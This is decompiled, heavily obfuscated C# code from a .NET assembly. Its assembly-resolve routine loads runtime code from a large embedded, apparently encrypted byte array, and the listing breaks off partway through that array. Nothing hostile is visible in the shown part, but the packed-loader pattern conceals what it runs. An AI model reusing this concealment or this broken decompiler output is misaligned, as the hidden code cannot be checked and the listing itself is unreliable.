using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Security;
using System.Windows.Forms;
using System.Xml;
using System.Xml.Linq;
using System.Xml.Serialization;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;

namespace ns0;

[EditorBrowsable(EditorBrowsableState.Never)]
internal sealed class Class3
{
	[EditorBrowsable(EditorBrowsableState.Never)]
	private sealed class Class4
	{
		private Class12.Struct7 struct7_0;

		private Class12.Class13.Class15 class15_0 = new Class12.Class13.Class15();

		internal XNamespace[] xnamespace_0;

		[EditorBrowsable(EditorBrowsableState.Never)]
		internal Class4(string[] string_0, XNamespace[] xnamespace_1, List<XAttribute> list_0)
		{
			string[] string_ = (string[])(Array)string_0;
			struct7_0.string_0 = string_;
			XNamespace[] array = (xnamespace_0 = xnamespace_1);
			class15_0.list_0 = list_0;
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		internal XElement method_0(XElement xelement_0)
		{
			return (XElement)(IXmlSerializable)smethod_4(struct7_0.string_0, xnamespace_0, class15_0.list_0, xelement_0);
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		internal object method_1(object object_0)
		{
			XElement val = (XElement)((object_0 is XElement) ? object_0 : null);
			if (val != null)
			{
				return smethod_4(struct7_0.string_0, xnamespace_0, class15_0.list_0, val);
			}
			return object_0;
		}

		[SecuritySafeCritical]
		static Class4()
		{
			Class5.smethod_2();
		}
	}

	internal sealed class Class5
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 11671)]
		private struct Struct0
		{
		}

		internal sealed class Class6
		{
			[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 272)]
			private struct Struct1
			{
			}

			private static readonly object object_0;

			private static readonly object object_1;

			private static readonly Array array_0;

			internal static byte byte_0/* Not supported: data(00) */;

			[SecuritySafeCritical]
			internal static bool smethod_0<T>(T gparam_0, char char_0, int int_0) where T : WeakReference
			{
				int num = 0;
				bool result = (((char_0 ^ int_0) - 94) ^ 0) switch
				{
					0 => Class12.Class16.smethod_2((WeakReference)gparam_0, (short)774, 811), 
					_ => true, 
				};
				num++;
				return result;
			}

			[SecuritySafeCritical]
			internal static void smethod_1<T>(T gparam_0, Size size_0, short short_0, char char_0) where T : Form
			{
				int num = 0;
				do
				{
					switch (((char_0 ^ short_0) - 37) ^ num)
					{
					case 0:
						Class12.Class16.smethod_3<Form>((Form)(object)gparam_0, size_0, 832, 839);
						break;
					}
					num++;
				}
				while ((char_0 * char_0 + char_0) % 2 != 0);
			}

			[SecuritySafeCritical]
			internal static bool smethod_2<T, U>(U gparam_0, T gparam_1, int int_0, short short_0) where T : Assembly where U : Assembly
			{
				int num = 0;
				bool result;
				int num2;
				do
				{
					result = (((short_0 ^ int_0) - 19) ^ num) switch
					{
						0 => Class12.smethod_2((Assembly)gparam_0, (Assembly)gparam_1, (short)248, 213), 
						_ => true, 
					};
					num++;
					num2 = short_0 * short_0;
					num2 = short_0 + num2;
				}
				while (num2 % 2 != 0);
				return result;
			}

			[SecuritySafeCritical]
			internal static AppDomain smethod_3(int int_0, int int_1)
			{
				int num = 0;
				AppDomain result = (((int_0 ^ int_1) - 39) ^ 0) switch
				{
					0 => Class10.Class11.smethod_8(372, 265), 
					_ => null, 
				};
				num++;
				return result;
			}

			[SecuritySafeCritical]
			internal static void smethod_4<T>(T gparam_0, byte[] byte_1, int int_0, int int_1, int int_2, char char_0) where T : Stream
			{
				int num = 0;
				switch (((int_2 ^ char_0) - 92) ^ 0)
				{
				case 0:
					Class12.smethod_3((Stream)gparam_0, byte_1, int_0, int_1, 202, '\u0082');
					break;
				}
				num++;
			}

			[SecuritySafeCritical]
			internal static string smethod_5<T>(T gparam_0, char char_0, char char_1) where T : XElement
			{
				int num = 0;
				string result;
				int num2;
				do
				{
					result = (((char_1 ^ char_0) - 82) ^ num) switch
					{
						0 => Class12.Class13.smethod_4<XElement>((XElement)(object)gparam_0, 42, 30), 
						_ => null, 
					};
					num++;
					num2 = char_1 * char_1;
					num2 = char_1 + num2;
				}
				while (num2 % 2 != 0);
				return result;
			}

			[SecuritySafeCritical]
			internal static bool smethod_6<T, U>(T gparam_0, U gparam_1, short short_0, short short_1) where T : string where U : string
			{
				int num = 0;
				bool result;
				int num2;
				do
				{
					result = (((short_1 ^ short_0) - 24) ^ num) switch
					{
						0 => Class10.smethod_2((string)gparam_0, (string)gparam_1, 235, 160), 
						_ => false, 
					};
					num++;
					num2 = short_1 * short_1;
					num2 = short_1 + num2;
				}
				while (num2 % 2 != 0);
				return result;
			}

			[SecuritySafeCritical]
			internal static void smethod_7<T>(T gparam_0, short short_0, short short_1) where T : Exception
			{
				int num = 0;
				int num2;
				do
				{
					switch (((short_1 ^ short_0) - 26) ^ num)
					{
					case 0:
						Class10.smethod_1((Exception)gparam_0, 'Ɇ', 544);
						break;
					}
					num++;
					num2 = short_1 * short_1;
					num2 = short_1 + num2;
				}
				while (num2 % 2 != 0);
			}

			[SecuritySafeCritical]
			internal static void smethod_8(bool bool_0, int int_0, int int_1)
			{
				int num = 0;
				switch (((int_0 ^ int_1) - 68) ^ 0)
				{
				case 0:
					Class10.smethod_3(bool_0, 941, 1014);
					break;
				}
				num++;
			}

			static Class6()
			{
				object_1 = new char[136];
				char[] array = new char[8];
				array[0] = 'ⶑ';
				array[6] = 'Ằ';
				array[5] = '⊮';
				array[4] = 'ඉ';
				array[2] = '\u0322';
				array[7] = 'Ⳮ';
				array[1] = '\u0f9c';
				array[3] = 'ℯ';
				array_0 = new string[7];
				object_0 = array;
			}
		}

		internal static Struct0 struct0_0/* Not supported: data

		private static bool bool_0;

		internal static Assembly smethod_0(object object_0, ResolveEventArgs resolveEventArgs_0)
		{
			return (Assembly)smethod_1(null, 13, resolveEventArgs_0, "329211b7-54bc-4c0b-bee2-eb30c1523ba0", 202, 11671);
		}

		internal static object smethod_1(string string_0, byte byte_0, object object_0, string string_1, int int_0, int int_1)
		{
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected O, but got Unknown
			//IL_0060: Unknown result type (might be due to invalid IL or missing references)
			//IL_0067: Expected O, but got Unknown
			if (int_1 > 0)
			{
				Assembly gparam_ = (Assembly)(IEvidenceFactory)Class9.smethod_5(97, '*');
				ResolveEventArgs gparam_2 = (ResolveEventArgs)object_0;
				if (Class6.smethod_2(Class7.smethod_6(gparam_2, 'ʪ', 'ʧ'), gparam_, 121, 106))
				{
					return null;
				}
				string gparam_3 = (string)(IEquatable<string>)smethod_6(string_1, "-F3E4", 26, 50);
				AppDomain gparam_4 = (AppDomain)(IEvidenceFactory)Class6.smethod_3(889, 862);
				Dictionary<string, string> dictionary = (Dictionary<string, string>)Class7.smethod_7(gparam_4, string_1, 60, 71);
				Assembly assembly;
				if (dictionary == null)
				{
					dictionary = new Dictionary<string, string>();
					Class3.smethod_12(gparam_4, string_1, (object)dictionary, 'Ą', 'ű');
					byte[] array = new byte[11671]
					{
						32, 178, 198, 168, 202, 5, 162, 36, 57, 212,
						92, 5, 220, 155, 75, 215, 77, 254, 246, 113,
						195, 170, 186, 246, 193, 119, 247, 231, 52, 124,
						143, 189, 73, 198, 62, 74, 217, 99, 97, 136,
						62, 230, 78, 218, 216, 123, 163, 148, 252, 180,
						93, 29, 202, 150, 158, 48, 84, 229, 180, 126,
						99, 81, 122, 242, 85, 71, 211, 212, 127, 142,
						213, 153, 72, 207, 217, 253, 197, 111, 104, 168,
						107, 12, 56, 86, 3, 247, 106, 191, 134, 121,
						196, 156, 103, 183, 205, 155, 246, 118, 208, 252,
						141, 111, 47, 16, 80, 141, 200, 167, 71, 87,
						196, 19, 29, 201, 210, 59, 178, 164, 142, 223,
						220, 113, 116, 167, 145, 79, 253, 17, 60, 73,
						55, 80, 145, 217, 132, 173, 166, 86, 24, 216,
						161, 246, 220, 235, 163, 18, 189, 117, 13, 30,
						73, 108, 234, 143, 184, 4, 19, 40, 177, 150,
						160, 200, 174, 161, 21, 68, 233, 197, 216, 103,
						76, 73, 111, 103, 49, 216, 174, 40, 81, 58,
						94, 14, 89, 103, 108, 238, 181, 149, 100, 83,
						186, 156, 144, 61, 9, 93, 233, 235, 42, 107,
						183, 17, 209, 103, 223, 26, 54, 14, 145, 243,
						14, 255, 79, 209, 74, 26, 161, 212, 244, 49,
						13, 171, 71, 107, 47, 130, 207, 107, 254, 210,
						161, 193, 132, 96, 60, 4, 149, 66, 189, 148,
						97, 95, 86, 130, 218, 205, 159, 63, 235, 70,
						141, 54, 230, 22, 56, 251, 60, 143, 117, 139,
						15, 158, 27, 211, 213, 212, 184, 155, 206, 9,
						229, 20, 66, 136, 139, 52, 81, 94, 90, 76,
						249, 41, 126, 47, 155, 146, 244, 160, 229, 50,
						141, 169, 122, 186, 175, 239, 66, 59, 99, 205,
						29, 10, 11, 124, 126, 205, 163, 138, 182, 28,
						99, 199, 250, 11, 140, 252, 96, 49, 42, 226,
						150, 151, 187, 18, 62, 207, 155, 233, 95, 178,
						44, 217, 85, 37, 41, 109, 218, 160, 20, 22,
						190, 212, 90, 202, 63, 166, 72, 213, 252, 21,
						86, 34, 100, 238, 178, 72, 148, 52, 21, 134,
						12, 69, 27, 134, 242, 246, 97, 223, 203, 174,
						166, 141, 166, 52, 218, 205, 36, 149, 41, 193,
						199, 47, 204, 96, 118, 219, 147, 143, 67, 143,
						48, 142, 140, 242, 194, 6, 226, 110, 133, 26,
						34, 115, 142, 142, 144, 54, 13, 184, 83, 177,
						193, 165, 152, 246, 246, 36, 216, 42, 148, 183,
						134, 213, 225, 55, 46, 186, 254, 57, 146, 234,
						226, 34, 198, 1, 186, 10, 69, 48, 34, 225,
						78, 93, 208, 253, 167, 191, 80, 218, 35, 20,
						180, 45, 34, 99, 231, 186, 172, 240, 45, 24,
						152, 169, 220, 254, 212, 144, 44, 93, 252, 159,
						87, 91, 229, 127, 120, 215, 60, 32, 116, 104,
						134, 158, 175, 150, 105, 194, 55, 231, 79, 242,
						182, 157, 99, 76, 100, 126, 246, 130, 111, 149,
						156, 32, 230, 214, 190, 15, 217, 228, 49, 206,
						231, 81, 206, 175, 130, 67, 223, 165, 130, 172,
						158, 249, 70, 185, 36, 129, 161, 149, 233, 57,
						167, 233, 51, 191, 220, 33, 175, 31, 20, 40,
						150, 68, 124, 8, 235, 235, 193, 59, 203, 81,
						100, 144, 152, 130, 229, 57, 226, 8, 51, 126,
						163, 168, 117, 183, 31, 253, 100, 240, 163, 173,
						161, 233, 68, 249, 173, 242, 145, 182, 180, 78,
						195, 144, 217, 108, 32, 16, 123, 11, 82, 232,
						193, 99, 230, 1, 80, 187, 37, 221, 201, 192,
						72, 146, 225, 228, 13, 12, 117, 23, 97, 23,
						53, 158, 155, 123, 60, 161, 46, 158, 219, 157,
						101, 29, 222, 40, 247, 147, 154, 220, 206, 48,
						116, 22, 11, 227, 155, 21, 221, 153, 99, 59,
						82, 171, 59, 154, 108, 218, 234, 76, 227, 163,
						24, 162, 240, 162, 51, 226, 5, 8, 5, 108,
						245, 64, 244, 7, 84, 224, 122, 145, 68, 134,
						168, 243, 56, 103, 121, 52, 41, 36, 208, 40,
						80, 133, 17, 24, 99, 227, 119, 45, 190, 49,
						44, 255, 224, 4, 213, 149, 19, 200, 223, 93,
						17, 1, 193, 212, 51, 155, 6, 219, 2, 131,
						209, 56, 4, 134, 38, 30, 136, 241, 170, 193,
						153, 174, 36, 109, 162, 181, 160, 159, 6, 215,
						59, 160, 242, 212, 65, 186, 116, 93, 116, 197,
						57, 207, 47, 48, 57, 151, 178, 199, 52, 63,
						231, 69, 216, 181, 70, 48, 94, 201, 13, 79,
						144, 38, 26, 215, 98, 110, 217, 224, 207, 7,
						254, 4, 71, 196, 219, 246, 75, 146, 163, 163,
						29, 10, 101, 217, 128, 21, 255, 82, 127, 186,
						107, 22, 132, 196, 157, 70, 187, 186, 196, 31,
						85, 26, 146, 123, 173, 8, 238, 233, 165, 223,
						31, 131, 88, 237, 131, 16, 34, 116, 129, 85,
						128, 188, 212, 174, 35, 79, 13, 53, 77, 0,
						54, 76, 83, 136, 170, 91, 26, 111, 47, 246,
						116, 37, 33, 244, 79, 56, 177, 167, 89, 213,
						243, 110, 13, 145, 29, 71, 45, 210, 86, 6,
						59, 105, 14, 215, 118, 244, 251, 43, 248, 188,
						81, 209, 49, 105, 114, 32, 17, 175, 20, 186,
						87, 201, 184, 139, 2, 167, 151, 154, 98, 110,
						86, 224, 165, 150, 106, 57, 71, 255, 23, 253,
						218, 104, 64, 221, 53, 126, 111, 213, 29, 22,
						211, 15, 243, 108, 129, 44, 73, 236, 251, 14,
						201, 104, 136, 173, 36, 201, 201, 5, 181, 197,
						181, 27, 130, 80, 229, 66, 236, 3, 246, 94,
						179, 127, 224, 96, 90, 29, 202, 230, 146, 208,
						198, 44, 167, 208, 200, 17, 67, 218, 46, 81,
						192, 44, 187, 204, 17, 14, 220, 33, 226, 89,
						219, 22, 204, 201, 159, 203, 88, 22, 80, 1,
						112, 207, 7, 181, 186, 215, 82, 207, 236, 3,
						211, 145, 184, 113, 52, 159, 111, 231, 233, 207,
						250, 223, 70, 69, 237, 134, 38, 147, 131, 230,
						109, 150, 205, 52, 122, 29, 203, 77, 109, 88,
						145, 138, 56, 16, 48, 151, 206, 4, 149, 254,
						230, 199, 200, 116, 143, 197, 80, 23, 126, 186,
						71, 127, 2, 150, 71, 68, 208, 68, 63, 105,
						0, 185, 188, 169, 171, 179, 209, 219, 74, 255,
						76, 234, 56, 29, 86, 135, 137, 20, 219, 216,
						1, 216, 12, 203, 112, 140, 45, 174, 217, 91,
						45, 83, 205, 177, 177, 96, 116, 113, 7, 198,
						170, 249, 70, 153, 95, 195, 180, 15, 84, 167,
						234, 11, 134, 243, 139, 40, 69, 76, 137, 212,
						250, 141, 223, 128, 87, 112, 37, 154, 212, 66,
						39, 40, 150, 103, 128, 143, 130, 182, 54, 89,
						217, 161, 40, 81, 5, 233, 17, 30, 49, 3,
						208, 242, 242, 60, 251, 87, 117, 196, 26, 171,
						121, 239, 129, 140, 255, 190, 62, 222, 37, 82,
						96, 245, 155, 166, 94, 8, 92, 13, 80, 70,
						25, 173, 146, 3, 96, 91, 196, 189, 169, 28,
						85, 29, 197, 174, 124, 65, 143, 126, 244, 180,
						7, 99, 36, 74, 148, 173, 32, 95, 167, 130,
						60, 94, 80, 194, 6, 126, 153, 0, 218, 2,
						47, 64, 54, 132, 106, 254, 68, 71, 56, 218,
						218, 60, 225, 103, 34, 220, 97, 225, 240, 44,
						83, 83, 10, 73, 145, 105, 239, 92, 27, 24,
						79, 42, 60, 247, 71, 19, 93, 35, 144, 187,
						59, 191, 82, 78, 242, 199, 173, 176, 221, 251,
						55, 191, 114, 255, 170, 236, 72, 196, 102, 146,
						33, 231, 189, 185, 171, 217, 32, 233, 239, 221,
						102, 240, 99, 67, 208, 9, 209, 82, 161, 245,
						97, 64, 251, 137, 100, 9, 63, 46, 51, 54,
						200, 167, 150, 73, 28, 220, 200, 198, 111, 146,
						117, 218, 9, 130, 115, 108, 172, 125, 151, 99,
						101, 164, 145, 137, 121, 213, 40, 137, 86, 243,
						116, 179, 14, 188, 107, 177, 230, 91, 80, 43,
						186, 166, 5, 192, 193, 89, 44, 161, 95, 228,
						99, 41, 103, 134, 188, 20, 118, 215, 144, 41,
						210, 109, 52, 159, 199, 169, 59, 122, 78, 15,
						198, 65, 255, 24, 65, 235, 4, 171, 108, 172,
						42, 38, 107, 179, 66, 42, 98, 27, 107, 156,
						5, 226, 5, 34, 100, 14, 92, 197, 127, 201,
						134, 19, 38, 39, 129, 193, 75, 67, 84, 223,
						88, 115, 187, 126, 230, 178, 172, 100, 34, 14,
						162, 173, 134, 229, 156, 67, 203, 168, 195, 128,
						187, 62, 89, 89, 59, 229, 12, 85, 162, 230,
						111, 149, 191, 184, 39, 226, 176, 217, 81, 157,
						161, 160, 5, 134, 156, 170, 214, 207, 42, 132,
						197, 239, 122, 238, 27, 97, 89, 139, 227, 194,
						93, 84, 177, 236, 39, 207, 78, 110, 3, 88,
						52, 88, 232, 54, 83, 19, 26, 62, 244, 207,
						199, 111, 86, 31, 202, 183, 241, 47, 25, 157,
						9, 15, 231, 181, 104, 91, 56, 121, 9, 228,
						32, 197, 159, 4, 84, 205, 145, 154, 48, 171,
						180, 247, 46, 112, 211, 144, 225, 165, 154, 14,
						144, 221, 159, 137, 99, 133, 226, 59, 102, 22,
						255, 52, 170, 30, 60, 228, 183, 51, 171, 171,
						76, 178, 162, 53, 9, 105, 31, 32, 203, 143,
						255, 158, 90, 107, 159, 88, 109, 128, 147, 195,
						224, 184, 85, 142, 2, 84, 20, 35, 184, 109,
						80, 44, 193, 114, 125, 38, 34, 226, 228, 132,
						204, 84, 75, 3, 51, 227, 27, 104, 193, 76,
						199, 16, 62, 159, 188, 53, 222, 144, 65, 189,
						28, 247, 187, 204, 193, 92, 203, 127, 55, 200,
						53, 168, 130, 60, 27, 82, 173, 7, 195, 31,
						228, 187, 198, 168, 56, 131, 62, 100, 30, 174,
						38, 191, 250, 62, 111, 56, 202, 76, 41, 71,
						23, 103, 95, 238, 45, 46, 201, 149, 244, 151,
						26, 130, 13, 46, 86, 103, 194, 155, 192, 23,
						225, 129, 158, 133, 120, 135, 91, 240, 238, 149,
						152, 143, 85, 57, 102, 159, 110, 205, 112, 125,
						207, 190, 15, 0, 203, 157, 64, 206, 57, 205,
						80, 27, 11, 153, 30, 231, 28, 110, 208, 46,
						212, 201, 67, 107, 38, 132, 181, 29, 109, 193,
						138, 140, 21, 181, 184, 233, 154, 210, 100, 194,
						6, 130, 86, 251, 182, 183, 195, 141, 139, 179,
						187, 204, 132, 208, 194, 236, 139, 149, 27, 86,
						142, 191, 28, 151, 104, 6, 239, 223, 33, 101,
						196, 165, 198, 199, 249, 196, 145, 255, 145, 228,
						170, 99, 243, 244, 139, 105, 199, 49, 220, 1,
						26, 112, 83, 171, 41, 223, 202, 234, 219, 89,
						122, 188, 138, 56, 199, 1, 9, 148, 37, 108,
						104, 126, 16, 42, 48, 182, 169, 216, 225, 82,
						7, 197, 141, 12, 195, 208, 210, 118, 158, 181,
						215, 133, 149, 167, 211, 51, 201, 122, 234, 60,
						8, 205, 167, 190, 172, 121, 212, 151, 186, 91,
						13, 205, 127, 46, 89, 50, 233, 226, 138, 198,
						66, 175, 213, 246, 204, 172, 238, 75, 56, 239,
						98, 74, 67, 53, 64, 158, 235, 4, 240, 184,
						22, 62, 82, 224, 224, 8, 103, 92, 207, 227,
						173, 216, 59, 21, 20, 156, 184, 212, 139, 139,
						196, 154, 3, 184, 185, 240, 213, 71, 109, 55,
						138, 57, 138, 101, 53, 251, 239, 42, 216, 201,
						143, 112, 234, 25, 46, 37, 173, 33, 26, 26,
						115, 201, 163, 69, 139, 70, 131, 77, 102, 224,
						220, 52, 37, 148, 222, 183, 20, 155, 72, 204,
						204, 171, 109, 180, 61, 113, 147, 126, 114, 78,
						232, 61, 16, 127, 155, 124, 26, 69, 149, 33,
						30, 121, 208, 3, 166, 246, 55, 29, 196, 35,
						59, 105, 179, 208, 185, 111, 125, 218, 95, 61,
						153, 160, 50, 143, 123, 139, 171, 241, 46, 222,
						16, 143, 46, 234, 145, 171, 1, 231, 48, 221,
						28, 158, 56, 92, 41, 95, 169, 198, 216, 110,
						119, 194, 163, 126, 26, 248, 198, 1, 93, 128,
						9, 252, 51, 15, 176, 206, 33, 101, 156, 122,
						10, 151, 213, 74, 212, 98, 46, 131, 248, 91,
						167, 199, 105, 25, 213, 237, 148, 150, 184, 241,
						38, 39, 28, 207, 89, 25, 124, 30, 109, 222,
						229, 84, 174, 133, 138, 200, 196, 67, 19, 20,
						223, 9, 136, 180, 20, 81, 61, 130, 64, 63,
						159, 131, 78, 49, 116, 239, 89, 210, 131, 35,
						108, 46, 46, 11, 131, 179, 111, 149, 25, 187,
						80, 241, 56, 22, 117, 122, 102, 19, 117, 52,
						43, 137, 136, 99, 56, 90, 176, 100, 218, 165,
						236, 93, 179, 197, 110, 161, 45, 227, 149, 106,
						214, 15, 253, 222, 156, 109, 178, 138, 177, 181,
						85, 149, 151, 223, 153, 194, 215, 178, 63, 177,
						50, 234, 186, 45, 34, 248, 74, 3, 148, 74,
						161, 27, 161, 159, 86, 123, 86, 218, 34, 138,
						164, 37, 203, 89, 81, 119, 134, 138, 185, 188,
						61, 113, 86, 170, 44, 160, 130, 198, 27, 143,
						25, 114, 108, 219, 188, 212, 240, 25, 36, 217,
						214, 78, 117, 227, 21, 48, 72, 151, 139, 241,
						146, 25, 104, 69, 111, 94, 65, 42, 136, 41,
						35, 45, 175, 224, 119, 177, 72, 102, 90, 225,
						198, 128, 198, 56, 93, 219, 55, 48, 216, 185,
						188, 177, 56, 108, 169, 39, 15, 251, 138, 184,
						85, 112, 182, 91, 43, 91, 160, 91, 100, 185,
						133, 107, 84, 182, 237, 119, 41, 76, 195, 200,
						1, 26, 109, 119, 249, 241, 78, 111, 246, 40,
						40, 144, 13, 13, 30, 216, 3, 254, 76, 35,
						210, 209, 93, 125, 116, 108, 59, 204, 78, 35,
						234, 28, 254, 148, 161, 162, 35, 76, 49, 191,
						185, 12, 94, 76, 52, 134, 104, 153, 10, 231,
						208, 243, 144, 16, 4, 100, 180, 50, 0, 61,
						41, 0, 198, 176, 16, 108, 123, 195, 57, 69,
						127, 53, 10, 62, 59, 40, 115, 114, 137, 247,
						46, 66, 46, 235, 57, 190, 206, 183, 61, 197,
						173, 251, 191, 79, 229, 50, 119, 255, 212, 62,
						193, 206, 148, 78, 117, 7, 121, 134, 145, 23,
						192, 171, 237, 79, 213, 38, 168, 226, 20, 189,
						1, 118, 186, 91, 44, 122, 178, 187, 127, 29,
						93, 38, 179, 201, 171, 166, 250, 255, 96, 123,
						186, 217, 11, 238, 148, 181, 213, 111, 123, 186,
						70, 218, 144, 124, 139, 246, 228, 195, 160, 9,
						35, 186, 26, 52, 17, 126, 252, 250, 150, 251,
						100, 49, 63, 206, 0, 208, 118, 68, 164, 226,
						145, 170, 111, 25, 104, 174, 59, 68, 212, 241,
						45, 18, 250, 171, 46, 246, 44, 133, 190, 124,
						152, 28, 116, 20, 26, 149, 6, 185, 16, 148,
						202, 227, 246, 80, 181, 95, 104, 0, 34, 131,
						65, 10, 1, 183, 80, 199, 140, 233, 206, 157,
						102, 25, 10, 206, 49, 21, 32, 162, 46, 166,
						48, 186, 235, 30, 28, 115, 163, 44, 234, 170,
						126, 177, 244, 183, 208, 112, 70, 235, 104, 78,
						169, 90, 186, 54, 194, 40, 106, 34, 155, 182,
						191, 100, 221, 7, 216, 152, 113, 36, 177, 253,
						211, 84, 72, 244, 243, 204, 106, 6, 122, 72,
						141, 15, 221, 128, 117, 72, 128, 82, 139, 241,
						27, 34, 230, 254, 147, 184, 219, 159, 211, 61,
						143, 32, 149, 85, 207, 84, 157, 210, 219, 226,
						16, 225, 146, 123, 210, 255, 144, 199, 68, 142,
						125, 128, 59, 112, 188, 116, 80, 176, 223, 168,
						170, 21, 26, 35, 125, 20, 102, 231, 19, 4,
						100, 16, 77, 103, 36, 8, 196, 75, 77, 173,
						159, 210, 154, 253, 188, 178, 179, 112, 121, 191,
						121, 45, 148, 93, 20, 64, 241, 129, 101, 164,
						68, 93, 34, 4, 164, 9, 111, 192, 5, 118,
						191, 23, 26, 110, 71, 107, 19, 78, 169, 94,
						2, 120, 116, 180, 25, 147, 142, 81, 53, 27,
						44, 145, 69, 253, 153, 177, 146, 87, 25, 248,
						239, 205, 20, 68, 39, 199, 97, 229, 82, 205,
						202, 137, 191, 113, 245, 162, 40, 7, 32, 205,
						154, 92, 91, 222, 113, 220, 36, 50, 59, 137,
						232, 173, 44, 200, 179, 218, 231, 249, 127, 196,
						252, 114, 190, 84, 81, 247, 145, 220, 227, 108,
						35, 126, 244, 226, 146, 99, 212, 101, 171, 210,
						199, 255, 106, 213, 94, 164, 19, 199, 101, 113,
						70, 80, 219, 4, 109, 182, 151, 177, 121, 78,
						160, 229, 128, 157, 244, 220, 245, 80, 178, 165,
						99, 151, 147, 168, 28, 159, 253, 240, 43, 168,
						157, 189, 152, 63, 238, 108, 25, 186, 209, 183,
						8, 123, 141, 88, 72, 232, 86, 246, 161, 201,
						212, 96, 19, 98, 69, 21, 89, 15, 178, 163,
						213, 237, 114, 162, 118, 12, 29, 74, 99, 112,
						118, 192, 104, 192, 120, 156, 154, 214, 233, 59,
						229, 13, 239, 233, 103, 248, 43, 172, 167, 41,
						223, 227, 155, 157, 127, 194, 179, 235, 83, 32,
						253, 39, 33, 80, 22, 116, 88, 246, 27, 101,
						205, 49, 9, 237, 125, 111, 39, 115, 12, 209,
						102, 203, 50, 107, 18, 51, 86, 100, 220, 249,
						101, 121, 77, 93, 171, 52, 101, 150, 47, 47,
						247, 83, 205, 182, 254, 173, 166, 39, 154, 202,
						174, 213, 165, 155, 107, 75, 221, 120, 3, 246,
						71, 50, 112, 165, 190, 102, 27, 107, 36, 47,
						156, 106, 55, 97, 82, 222, 97, 4, 18, 138,
						71, 44, 218, 81, 201, 194, 159, 33, 107, 160,
						39, 163, 98, 7, 116, 156, 30, 250, 29, 132,
						28, 157, 249, 220, 18, 116, 103, 115, 14, 32,
						95, 10, 244, 74, 65, 13, 44, 203, 241, 183,
						78, 190, 216, 11, 49, 43, 81, 76, 14, 233,
						27, 226, 19, 25, 168, 249, 248, 38, 197, 142,
						166, 83, 238, 91, 173, 87, 234, 248, 25, 194,
						93, 44, 141, 100, 14, 57, 181, 98, 25, 10,
						80, 35, 201, 112, 26, 230, 214, 217, 87, 61,
						159, 248, 250, 154, 30, 94, 137, 226, 11, 96,
						21, 136, 146, 75, 168, 189, 192, 132, 227, 210,
						156, 204, 27, 231, 174, 154, 254, 114, 240, 121,
						34, 128, 152, 119, 152, 89, 213, 51, 131, 60,
						110, 149, 11, 162, 22, 72, 148, 108, 231, 31,
						36, 115, 14, 157, 103, 142, 160, 42, 59, 28,
						171, 187, 190, 214, 206, 129, 88, 137, 217, 175,
						183, 14, 154, 75, 54, 232, 76, 241, 168, 19,
						26, 194, 169, 109, 104, 151, 30, 6, 252, 148,
						128, 161, 97, 97, 191, 31, 114, 51, 232, 231,
						189, 42, 91, 189, 41, 37, 174, 96, 201, 25,
						39, 232, 36, 190, 166, 135, 38, 242, 149, 64,
						133, 131, 144, 36, 33, 238, 171, 255, 111, 222,
						25, 241, 206, 152, 255, 114, 111, 195, 142, 106,
						128, 65, 215, 235, 132, 63, 236, 36, 212, 130,
						123, 220, 122, 196, 111, 239, 31, 60, 223, 20,
						160, 48, 145, 152, 253, 147, 55, 140, 160, 254,
						83, 71, 8, 71, 6, 72, 2, 136, 227, 17,
						220, 174, 12, 222, 221, 231, 59, 210, 248, 38,
						213, 115, 80, 179, 223, 39, 152, 178, 255, 5,
						208, 249, 104, 254, 29, 134, 94, 87, 244, 2,
						224, 139, 27, 17, 5, 237, 74, 200, 250, 69,
						242, 206, 29, 196, 237, 33, 205, 153, 217, 226,
						165, 7, 95, 80, 226, 162, 250, 246, 132, 190,
						78, 37, 127, 131, 243, 85, 113, 22, 7, 126,
						245, 104, 168, 180, 122, 193, 76, 128, 116, 120,
						34, 161, 46, 80, 225, 148, 198, 228, 131, 97,
						130, 247, 161, 137, 48, 123, 51, 161, 140, 117,
						219, 250, 240, 248, 12, 172, 245, 83, 218, 241,
						252, 160, 19, 148, 249, 105, 226, 221, 89, 209,
						142, 232, 211, 110, 131, 196, 213, 47, 161, 63,
						14, 148, 188, 162, 175, 78, 17, 174, 160, 48,
						133, 166, 31, 55, 243, 76, 67, 248, 79, 95,
						154, 251, 3, 136, 223, 28, 249, 215, 24, 125,
						166, 114, 27, 219, 128, 191, 223, 62, 204, 197,
						129, 105, 88, 120, 231, 127, 78, 121, 205, 245,
						194, 184, 133, 17, 150, 2, 224, 245, 161, 169,
						129, 16, 226, 100, 213, 166, 211, 193, 171, 37,
						196, 181, 143, 61, 25, 67, 113, 180, 95, 216,
						92, 56, 196, 7, 233, 87, 34, 15, 22, 207,
						169, 240, 76, 206, 249, 44, 193, 120, 143, 5,
						33, 92, 119, 160, 252, 241, 75, 186, 87, 136,
						225, 67, 160, 166, 5, 169, 176, 53, 81, 174,
						69, 120, 222, 154, 161, 168, 224, 14, 19, 61,
						226, 146, 186, 108, 143, 195, 246, 160, 140, 181,
						160, 149, 209, 215, 188, 33, 130, 211, 235, 101,
						19, 10, 207, 193, 69, 36, 63, 105, 162, 117,
						205, 131, 3, 102, 210, 197, 99, 184, 28, 191,
						82, 55, 159, 210, 25, 25, 116, 137, 43, 111,
						239, 87, 245, 167, 79, 185, 210, 136, 134, 93,
						246, 189, 139, 108, 181, 242, 169, 138, 92, 219,
						198, 27, 181, 86, 125, 89, 239, 62, 91, 180,
						219, 162, 77, 173, 41, 167, 204, 119, 216, 204,
						184, 83, 1, 139, 164, 149, 211, 64, 97, 116,
						180, 51, 92, 37, 149, 117, 86, 162, 184, 183,
						129, 251, 101, 109, 207, 168, 10, 180, 7, 38,
						103, 147, 129, 47, 164, 24, 67, 192, 44, 208,
						143, 95, 96, 34, 147, 106, 125, 197, 116, 133,
						54, 185, 252, 45, 188, 214, 163, 101, 82, 231,
						109, 135, 164, 95, 239, 7, 104, 5, 73, 145,
						12, 253, 73, 144, 197, 16, 141, 223, 65, 245,
						226, 19, 168, 19, 118, 222, 155, 198, 254, 93,
						150, 182, 87, 70, 116, 98, 199, 28, 4, 13,
